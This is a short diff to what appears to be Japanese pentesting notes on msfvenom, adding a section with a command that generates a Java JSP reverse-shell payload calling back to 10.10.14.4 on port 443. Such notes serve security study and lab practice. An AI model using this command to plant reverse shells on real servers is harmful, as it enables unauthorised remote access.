@@ -4,4 +4,7 @@ msfvenom --list payload # いろいろなペイロードが表示される。
 msfvenom --list payload # こんな感じで使用できる。
 ```
 
-## ## ｓ
+## ## 作成する
+```zsh
+msfvenom --payload java/jsp_shell_reverse_tcp --format raw --out shell.jsp LHOST=10.10.14.4 LPORT=443
+```
